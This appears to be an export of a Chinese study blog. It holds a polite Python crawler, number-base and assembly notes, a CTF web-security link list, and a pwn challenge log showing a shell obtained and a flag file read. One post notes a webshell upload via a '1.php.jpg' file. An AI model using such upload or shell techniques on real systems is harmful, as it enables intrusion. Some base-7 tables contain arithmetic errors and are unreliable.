resp.text)</span></span><br><span class="line"><span class="string">            html = None</span></span><br><span class="line"><span class="string">            if num_retries and 500 &lt;= resp.status_code &lt; 600:</span></span><br><span class="line"><span class="string">                return download(url, num_retries - 1)</span></span><br><span class="line"><span class="string">    except requests.exceptions.RequestException as e:</span></span><br><span class="line"><span class="string">        print("Download error", e.reason)</span></span><br><span class="line"><span class="string">        html = None</span></span><br><span class="line"><span class="string">    return html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">(url, user_agent=<span class="string">'wswp'</span>, robots=None, num_retries=<span class="number">5</span>,proxies = None)</span>:</span></span><br><span class="line">    print(<span class="string">"Downloading:"</span>, url)</span><br><span class="line">    headers = &#123;<span class="string">'User-Agent'</span>:user_agent&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.get(url, headers=headers, proxies = proxies)</span><br><span class="line">        html = resp.text</span><br><span class="line">        <span class="keyword">if</span> resp.status_code &gt; <span class="number">400</span>:</span><br><span class="line">            print(<span class="string">"Download error"</span>, resp.text)</span><br><span class="line">            html = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">if</span> num_retries <span class="keyword">and</span> <span class="number">500</span> &lt;= resp.status_code &lt; <span class="number">600</span>:</span><br><span class="line">                <span class="keyword">return</span> download(url,num_retries<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"Download error"</span>, e.reason)</span><br><span class="line">        html = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">craw_sitemap</span><span class="params">(url)</span>:</span></span><br><span class="line">    sitemap = download(url)</span><br><span class="line">    print(sitemap)</span><br><span class="line">    links = re.findall(<span class="string">r'&lt;loc&gt;(.*?)&lt;/loc&gt;'</span>, sitemap)</span><br><span class="line">    print(links)</span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">        html = download(link)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num_errors = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">craw_site</span><span class="params">(url, max_error=<span class="number">5</span>)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> itertools.count(<span class="number">1</span>):</span><br><span class="line">        pg_url = <span class="string">"&#123;&#125;&#123;&#125;"</span>.format(url, page)</span><br><span class="line">        html = download(pg_url)</span><br><span class="line">        <span class="keyword">if</span> html <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            num_errors += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> num_errors == max_error:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_links</span><span class="params">(html)</span>:</span></span><br><span class="line">    webpage_regex = re.compile(<span class="string">r'a href="(.*?)"&gt;'</span>)</span><br><span class="line">    <span class="keyword">return</span> webpage_regex.findall(html)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> robotparser</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_robots_parser</span><span class="params">(robots_url)</span>:</span></span><br><span class="line">    rp = robotparser.RobotFileParser()</span><br><span class="line">    rp.set_url(<span class="string">'http://example.python-scraping.com/robots.txt'</span>)</span><br><span class="line">    rp.read()</span><br><span class="line">    <span class="keyword">return</span> rp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link_craw</span><span class="params">(start_url, link_regex, robots_url = None, user_agent = <span class="string">'wswp'</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> robots_url:</span><br><span class="line">        robots_url = <span class="string">'&#123;&#125;/robots.txt'</span>.format(start_url)</span><br><span class="line">    rp = get_robots_parser(robots_url)</span><br><span class="line">    craw_queue = [start_url]</span><br><span class="line">    seen = set(craw_queue)</span><br><span class="line">    <span class="keyword">while</span> craw_queue:</span><br><span class="line">        url = craw_queue.pop()</span><br><span class="line">        <span class="keyword">if</span> rp.can_fetch(user_agent,url):</span><br><span class="line">            html = download(url,user_agent=user_agent)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"Blocked by robots.txt"</span>, url)</span><br><span class="line">            html = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> html <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> get_links(html):</span><br><span class="line">            <span class="keyword">if</span> re.match(link_regex, link):</span><br><span class="line">                abs_link = urljoin(start_url, link)</span><br><span class="line">                <span class="keyword">if</span> abs_link <span class="keyword">not</span> <span class="keyword">in</span> seen:</span><br><span class="line">                    seen.add(abs_link)</span><br><span class="line">                    craw_queue.append(abs_link)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># craw_sitemap("http://example.python-scraping.com/sitemap.xml")</span></span><br><span class="line">    <span class="comment">#craw_site("http://example.python-scraping.com/view/-")</span></span><br><span class="line">    link_craw(<span class="string">'http://example.python-scraping.com'</span>, <span class="string">'/places/default/(index|view)'</span>,user_agent=<span class="string">'BadCrawler'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>链接爬取时需要关注重复链接</li>
<li>关注robots.txt</li>
<li>利用数据库id爬取网站</li>
<li>自己分析网页并善用正则匹配</li>
<li>requests库相对简单</li>
</ol>
]]></content>
      <categories>
        <category>python基础</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>re学习第一天</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h1><ol>
<li>进制的实质就是查表</li>
<li>熟悉2进制跟16进制的转换</li>
<li>熟悉进制表的制作以及计算进制之间的加减乘除</li>
</ol><h1 id="进制练习1"><a href="#进制练习1" class="headerlink" title="进制练习1"></a>进制练习1</h1><p>通过编写7进制加法表，乘法表，并计算<br>23456+54356 = ？<br>5621 - 654 = ？<br>234 * 65 = ？</p><h2 id="首先编写1-100的7进制数据"><a href="#首先编写1-100的7进制数据" class="headerlink" title="首先编写1-100的7进制数据"></a>首先编写1-100的7进制数据</h2><table>
<thead>
<tr>
<th>一</th>
<th>二</th>
<th>三</th>
<th>四</th>
<th>五</th>
<th>六</th>
<th>七</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>1</td>
<td>2</td>
<td>3</td>
<td>4</td>
<td>5</td>
<td>6</td>
</tr>
<tr>
<td>10</td>
<td>11</td>
<td>12</td>
<td>13</td>
<td>14</td>
<td>15</td>
<td>16</td>
</tr>
<tr>
<td>20</td>
<td>21</td>
<td>22</td>
<td>23</td>
<td>24</td>
<td>25</td>
<td>26</td>
</tr>
<tr>
<td>30</td>
<td>31</td>
<td>32</td>
<td>33</td>
<td>34</td>
<td>35</td>
<td>36</td>
</tr>
<tr>
<td>40</td>
<td>41</td>
<td>42</td>
<td>43</td>
<td>44</td>
<td>45</td>
<td>46</td>
</tr>
<tr>
<td>50</td>
<td>51</td>
<td>52</td>
<td>53</td>
<td>54</td>
<td>55</td>
<td>56</td>
</tr>
<tr>
<td>60</td>
<td>61</td>
<td>62</td>
<td>63</td>
<td>64</td>
<td>65</td>
<td>66</td>
</tr>
</tbody></table><a id="more"></a>


<h2 id="编写7进制加法表"><a href="#编写7进制加法表" class="headerlink" title="编写7进制加法表"></a>编写7进制加法表</h2><table>
<thead>
<tr>
<th>一</th>
<th>二</th>
<th>三</th>
<th>四</th>
<th>五</th>
<th>六</th>
</tr>
</thead>
<tbody><tr>
<td>1+1=2</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1+2=3</td>
<td>2+2=4</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1+3=4</td>
<td>2+3=5</td>
<td>3+3=6</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1+4=5</td>
<td>2+4=6</td>
<td>3+4=10</td>
<td>4+4=11</td>
<td></td>
<td></td>
</tr>
<tr>
<td>1+5=6</td>
<td>2+5=10</td>
<td>3+5=11</td>
<td>4+5=12</td>
<td>5+5=13</td>
<td></td>
</tr>
<tr>
<td>1+6=7</td>
<td>2+6=11</td>
<td>3+6=12</td>
<td>4+6=13</td>
<td>5+6=14</td>
<td>6+6=15</td>
</tr>
</tbody></table>
<h2 id="编写7进制乘法表"><a href="#编写7进制乘法表" class="headerlink" title="编写7进制乘法表"></a>编写7进制乘法表</h2><table>
<thead>
<tr>
<th>一</th>
<th>二</th>
<th>三</th>
<th>四</th>
<th>五</th>
<th>六</th>
</tr>
</thead>
<tbody><tr>
<td>1*1=1</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1*2=2</td>
<td>2*2=4</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1*3=3</td>
<td>2*3=6</td>
<td>3*3=12</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1*4=4</td>
<td>2*4=11</td>
<td>3*4=14</td>
<td>4*4=22</td>
<td></td>
<td></td>
</tr>
<tr>
<td>1*5=5</td>
<td>2*5=13</td>
<td>3*5=21</td>
<td>4*5=26</td>
<td>5*5=34</td>
<td></td>
</tr>
<tr>
<td>1*6=6</td>
<td>2*6=15</td>
<td>3*6=24</td>
<td>4*6=33</td>
<td>5*6=42</td>
<td>6*6=51</td>
</tr>
</tbody></table>
<h2 id="计算结果"><a href="#计算结果" class="headerlink" title="计算结果"></a>计算结果</h2><p>$23456 + 54356 = ?$<br>计算过程： </p>
<ol>
<li>6+6 查表是15，进一位，留5</li>
<li>5+5 查表是13， 13 + 1,3+1查表为4，为14，进一位，留4</li>
<li>4+3 查表是10， 10 + 1,11，进一位，留1</li>
<li>3+4 查表是10， 10+1 = 11，进一位，留1</li>
<li>2+5 查表是10， 10+1 = 11，进一位，留1<br>结果为：111145</li>
</ol>
<p>$5621 - 654 = ?$<br>计算过程：</p>
<ol>
<li>1不够减，借一位，为11,11-4=？，查表可得为4，</li>
<li>2-1 = 1,1-5不够，借一位，11-5=3</li>
<li>5-6不够，15-6=6</li>
<li>4<br>结果为：4634</li>
</ol>
<p>$234 * 65 = ?$<br>计算过程：</p>
<ol>
<li>4*5 = 26，留6 进2</li>
<li>3*5 = 21， 21+2， 23，留3 进2</li>
<li>2*5 = 13   13+2=15 留5，进1</li>
<li>1536</li>
<li>4*6 = 33, 留3 进3</li>
<li>3*6 = 24， 24+3,4+3 == 10,留0，进3</li>
<li>2*6 = 15， 15+3， 5+3=11，进2，留1</li>
<li>2103<br>结果为：22536</li>
</ol>
<h1 id="2-3-1？可能嘛"><a href="#2-3-1？可能嘛" class="headerlink" title="2+3 = 1？可能嘛"></a>2+3 = 1？可能嘛</h1><p>可能，当定义如下的10进制时便可，0,2,3,1,5,6,7,8,9,4</p>
<h1 id="16进制与二进制的映射"><a href="#16进制与二进制的映射" class="headerlink" title="16进制与二进制的映射"></a>16进制与二进制的映射</h1><table>
<thead>
<tr>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
<th>9</th>
<th>A</th>
<th>B</th>
<th>C</th>
<th>D</th>
<th>E</th>
<th>F</th>
</tr>
</thead>
<tbody><tr>
<td>0001</td>
<td>0010</td>
<td>0011</td>
<td>0100</td>
<td>0101</td>
<td>0110</td>
<td>0111</td>
<td>1000</td>
<td>1001</td>
<td>1010</td>
<td>1011</td>
<td>1100</td>
<td>1101</td>
<td>1110</td>
<td>1111</td>
</tr>
<tr>
<td>#</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h1 id="自行编写进制加密"><a href="#自行编写进制加密" class="headerlink" title="自行编写进制加密"></a>自行编写进制加密</h1><p>定义如下的7进制，7，5,6,1,2,3,0<br>试着计算上题中的计算题目</p>
<h2 id="先编写进制对应"><a href="#先编写进制对应" class="headerlink" title="先编写进制对应"></a>先编写进制对应</h2><table>
<thead>
<tr>
<th>一</th>
<th>二</th>
<th>三</th>
<th>四</th>
<th>五</th>
<th>六</th>
<th>七</th>
</tr>
</thead>
<tbody><tr>
<td>4</td>
<td>5</td>
<td>6</td>
<td>1</td>
<td>2</td>
<td>3</td>
<td>0</td>
</tr>
<tr>
<td>54</td>
<td>55</td>
<td>56</td>
<td>51</td>
<td>52</td>
<td>53</td>
<td>50</td>
</tr>
<tr>
<td>64</td>
<td>65</td>
<td>66</td>
<td>61</td>
<td>62</td>
<td>63</td>
<td>60</td>
</tr>
<tr>
<td>14</td>
<td>15</td>
<td>16</td>
<td>11</td>
<td>12</td>
<td>13</td>
<td>10</td>
</tr>
<tr>
<td>24</td>
<td>25</td>
<td>26</td>
<td>21</td>
<td>22</td>
<td>23</td>
<td>20</td>
</tr>
<tr>
<td>34</td>
<td>35</td>
<td>36</td>
<td>31</td>
<td>32</td>
<td>33</td>
<td>30</td>
</tr>
<tr>
<td>04</td>
<td>05</td>
<td>06</td>
<td>01</td>
<td>02</td>
<td>03</td>
<td>00</td>
</tr>
</tbody></table>
<h2 id="编写7进制加法表-1"><a href="#编写7进制加法表-1" class="headerlink" title="编写7进制加法表"></a>编写7进制加法表</h2><table>
<thead>
<tr>
<th>一</th>
<th>二</th>
<th>三</th>
<th>四</th>
<th>五</th>
<th>六</th>
</tr>
</thead>
<tbody><tr>
<td>5+5=6</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>5+6=1</td>
<td>6+6=2</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>5+1=2</td>
<td>6+1=3</td>
<td>1+1=0</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>5+2=3</td>
<td>6+2=0</td>
<td>1+2=54</td>
<td>2+2=55</td>
<td></td>
<td></td>
</tr>
<tr>
<td>5+3=0</td>
<td>6+3=54</td>
<td>1+3=55</td>
<td>2+3=56</td>
<td>3+3=51</td>
<td></td>
</tr>
<tr>
<td>5+0=54</td>
<td>6+0=55</td>
<td>1+0=56</td>
<td>2+0=51</td>
<td>3+0=52</td>
<td>0+0=53</td>
</tr>
</tbody></table>
<h2 id="编写7进制乘法表-1"><a href="#编写7进制乘法表-1" class="headerlink" title="编写7进制乘法表"></a>编写7进制乘法表</h2><table>
<thead>
<tr>
<th>一</th>
<th>二</th>
<th>三</th>
<th>四</th>
<th>五</th>
<th>六</th>
</tr>
</thead>
<tbody><tr>
<td>5*5=5</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>5*6=6</td>
<td>6*6=2</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>5*1=1</td>
<td>6*1=0</td>
<td>1*1=56</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>5*2=2</td>
<td>6*2=55</td>
<td>1*2=53</td>
<td>2*2=66</td>
<td></td>
<td></td>
</tr>
<tr>
<td>5*3=3</td>
<td>6*3=51</td>
<td>1*3=65</td>
<td>2*3=60</td>
<td>3*3=12</td>
<td></td>
</tr>
<tr>
<td>5*0=0</td>
<td>6*0=53</td>
<td>1*0=62</td>
<td>2*0=11</td>
<td>3*0=26</td>
<td>0*0=35</td>
</tr>
</tbody></table>
<h2 id="计算"><a href="#计算" class="headerlink" title="计算"></a>计算</h2><p>$23456+54356=？$<br>计算过程：</p>
<ol>
<li>6+6 = 2 留2</li>
<li>5+5 = 6 留6</li>
<li>4+3 = 3 留3</li>
<li>3+4 = 3 留3</li>
<li>2+5 = 3 留3<br>结果：33362</li>
</ol>
<p>$5621-654=？$<br>计算过程：</p>
<ol>
<li>1-4 = 1</li>
<li>2-5 = 1</li>
<li>6-6 = 0</li>
<li>5<br>结果：5011</li>
</ol>
<p>$234*65=?$<br>计算过程：</p>
<ol>
<li>4*5 = 4</li>
<li>3*5 = 3</li>
<li>2*5 = 2</li>
<li>234</li>
<li>4*6 = 4</li>
<li>3*6 = 51 留1 进5</li>
<li>2*6 = 55 55 + 5 ， 5+5=6， 55+5=56，留6，进5</li>
<li>5614<br>结果：51434</li>
</ol>
<h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><h2 id="push-后，esp改动的一定是按机器字长来的吗？"><a href="#push-后，esp改动的一定是按机器字长来的吗？" class="headerlink" title="push 后，esp改动的一定是按机器字长来的吗？"></a>push 后，esp改动的一定是按机器字长来的吗？</h2><p>不一定，可以push 16位的二进制数，esp-2,不可以弄8进制的数<br>32位：</p>
<ul>
<li>push dword ptr ds:[0x1234] esp = esp - 4</li>
<li>push eax</li>
<li>push ax</li>
<li>push al X</li>
<li>push word ptr ds:[0x1234] esp = esp - 2</li>
</ul>
<ul>
<li>pop ax esp = esp + 2</li>
<li>pop eax</li>
</ul>
<p>pushad popad</p>
<h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><ol>
<li>进位标志CF（carry flag) 最高位产生进位或者借位，</li>
<li>奇偶标志位PF(Parity flag) 结果中1的个数，偶数PF=1,奇数PF=0</li>
<li>辅助进位标志AF(Auxiliary Carry flag) </li>
<li>零标志位ZF(zero flag) 用来反映结果是否是0</li>
<li>符号标志位SF（signed flag) 运算结果的符号位</li>
<li>溢出标志位OF(overflow flag)  </li>
</ol>
]]></content>
      <categories>
        <category>二进制</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>reverse,逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>linux qq测试</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="tencentqq"><a href="#tencentqq" class="headerlink" title="tencentqq"></a>tencentqq</h1><p>installing /usr/share/applications/qq.desktop<br>installing /usr/share/tencent-qq/qq<br>installing /usr/share/tencent-qq/qq.png<br>installing /usr/share/tencent-qq/qq.bmp<br>installing /usr/share/tencent-qq/res.db<br>installing /usr/share/tencent-qq/crashpad_handler</p>]]></content>
      <categories>
        <category>linux</category>
        <category>测试</category>
      </categories>
      <tags>
        <tag>linux,测试</tag>
      </tags>
  </entry>
  <entry>
    <title>v2ray_linux客户端构思</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="功能构思"><a href="#功能构思" class="headerlink" title="功能构思"></a>功能构思</h1><ol>
<li>修改监听端口</li>
<li>导入vmess</li>
<li>指定配置文件替换</li>
<li>界面输入配置进行更换</li>
<li>多账号切换</li>
<li>订阅更新</li>
<li>修改配置</li>
</ol><p>初步想法，做好后利用docker挂载/etc/v2ray目录，通过docker修改配置文件</p>]]></content>
      <categories>
        <category>linux</category>
        <category>v2ray</category>
      </categories>
      <tags>
        <tag>linux,v2ray,gui,客户端</tag>
      </tags>
  </entry>
  <entry>
    <title>2019软件测试web安全题目writeup收集</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h1><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>比比手速 靶机地址：101.71.29.5:10065</p><p>burp抓包可知密码<br>然后文件上传，1.php.jpg<br>连接小马</p><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p><a href="https://blog.zeddyu.info/2019/02/24/%E5%AE%89%E6%81%921%E6%9C%88%E6%9C%88%E8%B5%9B/" target="_blank" rel="noopener">https://blog.zeddyu.info/2019/02/24/%E5%AE%89%E6%81%921%E6%9C%88%E6%9C%88%E8%B5%9B/</a></p><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p><a href="https://blog.csdn.net/u011377996/article/details/83867976" target="_blank" rel="noopener">https://blog.csdn.net/u011377996/article/details/83867976</a></p><a id="more"></a>



<h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p><a href="https://ssyeats.github.io/2018/09/01/%E5%AE%89%E6%81%927%E6%9C%88%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98writeup/" target="_blank" rel="noopener">https://ssyeats.github.io/2018/09/01/%E5%AE%89%E6%81%927%E6%9C%88%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98writeup/</a><br>666_0rdorby_you_can</p>
<h1 id="6"><a href="#6" class="headerlink" title="6"></a>6</h1><p><a href="https://roytse.github.io/2017/07/03/CTF_WriteUp/#easy-login" target="_blank" rel="noopener">https://roytse.github.io/2017/07/03/CTF_WriteUp/#easy-login</a><br><a href="http://site3.sjk.space/dosgk1.php" target="_blank" rel="noopener">http://site3.sjk.space/dosgk1.php</a></p>
<p>a327f27394c63ef5d6b1eed9591b90a4</p>
<h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><p>抓包可得</p>
<p>c456aa77cf2bc89affb665194e9dee57</p>
<h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><p><a href="https://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/#Web2" target="_blank" rel="noopener">https://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/#Web2</a><br>aa5237a5fc25af3fa07f1d724f7548d7</p>
<h1 id="9"><a href="#9" class="headerlink" title="9"></a>9</h1><p><a href="http://flag0.com/2019/09/27/2019%E5%AE%89%E6%81%92%E6%9D%AFWeb%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%A4%A7%E8%B5%9B%E7%BB%83%E4%B9%A0%E8%B5%9BWriteup/" target="_blank" rel="noopener">http://flag0.com/2019/09/27/2019%E5%AE%89%E6%81%92%E6%9D%AFWeb%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%A4%A7%E8%B5%9B%E7%BB%83%E4%B9%A0%E8%B5%9BWriteup/</a></p>
<h1 id="10"><a href="#10" class="headerlink" title="10"></a>10</h1><p><a href="http://xcx1024.com/ArtInfo/524039.html" target="_blank" rel="noopener">http://xcx1024.com/ArtInfo/524039.html</a></p>
<p>981369acba32abc4e28103fedd4891d2</p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>练习</category>
      </categories>
      <tags>
        <tag>web安全,练习</tag>
      </tags>
  </entry>
  <entry>
    <title>tjctf2019比赛</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="Printf"><a href="#Printf" class="headerlink" title="Printf"></a>Printf</h1><p>Welcome to the brand new Security Consultants Inc. portal!<br>What would you like to do?<br>1.) View the Team!<br>2.) Check the date.<br>3.) Sign up for our newsletter!<br>4.) Report a bug.<br>x.) Exit.<br>Thanks for signing up for our newsletter!<br>Please enter your email address below:<br>I have your email as:<br>sh;#                                                           �                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             �aaaaaaaJ `sh: 1: Is: not found<br>$<br>Great! I have your information down as:<br>Name: Evan Shi<br>sh: 1: Email:: not found<br>$ cat flag.txt<br>tjctf{p0lygl0t_m0r3_l1k3_p0lynot}$  </p>]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>随便做的练习</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="writeup-1-练习"><a href="#writeup-1-练习" class="headerlink" title="writeup-1-练习"></a>writeup-1-练习</h1><h2 id="简单的re"><a href="#简单的re" class="headerlink" title="简单的re"></a>简单的re</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+0h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+60h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"input:"</span>, envp);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v10, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v10);</span><br><span class="line">  v3 = <span class="number">34</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="keyword">int</span> *)&amp;v10;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = *v5;</span><br><span class="line">      ++v5;</span><br><span class="line">      v7 = ~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x80808080</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v7 );</span><br><span class="line">    <span class="keyword">if</span> ( !(~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x8080</span>) )</span><br><span class="line">      v7 &gt;&gt;= <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x8080</span>) )</span><br><span class="line">      v5 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v5 + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= (<span class="keyword">char</span> *)v5 - __CFADD__((_BYTE)v7, (_BYTE)v7) - <span class="number">3</span> - (<span class="keyword">char</span> *)&amp;v10 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *((_BYTE *)&amp;v10 + i) ^= v3++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;szCmp, &amp;v10, <span class="number">0x16</span>uLL) )</span><br><span class="line">    _printf_chk(<span class="number">1L</span>L, <span class="string">"right\n"</span>, v8);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    _printf_chk(<span class="number">1L</span>L, <span class="string">"wrong\n"</span>, v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a>

<p>刚看以为很复杂，后面发觉前面的都是校验，只要异或下就可以了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">List = [<span class="number">0x44</span>, <span class="number">0x4F</span>, <span class="number">0x45</span>, <span class="number">0x42</span>, <span class="number">0x5D</span>, <span class="number">0x1E</span>, <span class="number">0x1B</span>, <span class="number">0x19</span>, <span class="number">0x43</span>, <span class="number">0x7E</span>, <span class="number">0x61</span>, <span class="number">0x1F</span>, <span class="number">0x61</span>, <span class="number">0x59</span>, <span class="number">0x7B</span>, <span class="number">0x76</span>, <span class="number">0x78</span>, <span class="number">0x65</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0x41</span>, <span class="number">0x4A</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(List)):</span><br><span class="line">    flag += chr(List[i]^(<span class="number">0x22</span>+i))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

